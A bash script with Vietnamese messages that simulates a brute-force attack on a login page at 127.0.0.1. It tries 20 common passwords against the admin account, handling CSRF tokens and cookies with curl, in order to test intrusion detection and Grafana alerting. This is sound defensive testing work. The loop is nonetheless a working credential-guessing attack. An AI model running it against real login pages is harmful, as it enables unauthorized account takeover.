#!/bin/bash
set -e

TARGET_URL="https://127.0.0.1/login"
USERNAME="admin"

PASSWORDS=(
  "123456" "password" "admin123" "qwerty" "letmein"
  "welcome1" "monkey" "football" "master" "login123"
  "pass1234" "shadow" "superman" "dragon" "trustno1"
  "iloveyou" "killer" "sunshine" "starwars" "badpassword20"
)

echo "================================================================================"
echo "KỊCH BẢN GIẢ LẬP TẤN CÔNG BRUTE FORCE VÀO TRANG ĐĂNG NHẬP"
echo "Mục đích: Kiểm thử hệ thống phát hiện xâm nhập và cảnh báo Grafana Alerting"
echo "Thời gian bắt đầu: $(date -u '+%Y-%m-%d %H:%M:%S UTC')"
echo "Mục tiêu: $TARGET_URL | Tài khoản: $USERNAME | Tổng số lần thử: 20"
echo "================================================================================"

COOKIE_JAR="/tmp/brute_cookies.txt"
LOGIN_PAGE="/tmp/login_page.html"

for i in "${!PASSWORDS[@]}"; do
  ATTEMPT=$((i + 1))
  PASS="${PASSWORDS[$i]}"
  rm -f "$COOKIE_JAR" "$LOGIN_PAGE"
  
  # 1. Lấy trang đăng nhập để có CSRF Token và Session Cookie
  curl -sk -c "$COOKIE_JAR" "$TARGET_URL" > "$LOGIN_PAGE"
  CSRF_TOKEN=$(grep 'name="_csrf"' "$LOGIN_PAGE" | head -n 1 | sed 's/.*value="//' | sed 's/".*//')
  
  # 2. Gửi request POST đăng nhập sai mật khẩu
  HTTP_STATUS=$(curl -sk -o /dev/null -w "%{http_code}" -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
    -d "username=$USERNAME" \
    -d "password=$PASS" \
    -d "_csrf=$CSRF_TOKEN" \
    "$TARGET_URL")
    
  TIMESTAMP=$(date -u '+%H:%M:%S')
  echo "[$TIMESTAMP] Lần thử $ATTEMPT/20: User='$USERNAME' Pass='$PASS' => HTTP Status: $HTTP_STATUS"
  
  rm -f "$COOKIE_JAR" "$LOGIN_PAGE"
  sleep 0.5
done

echo "================================================================================"
echo "Hoàn tất kịch bản Brute Force lúc: $(date -u '+%Y-%m-%d %H:%M:%S UTC')"
echo "================================================================================"
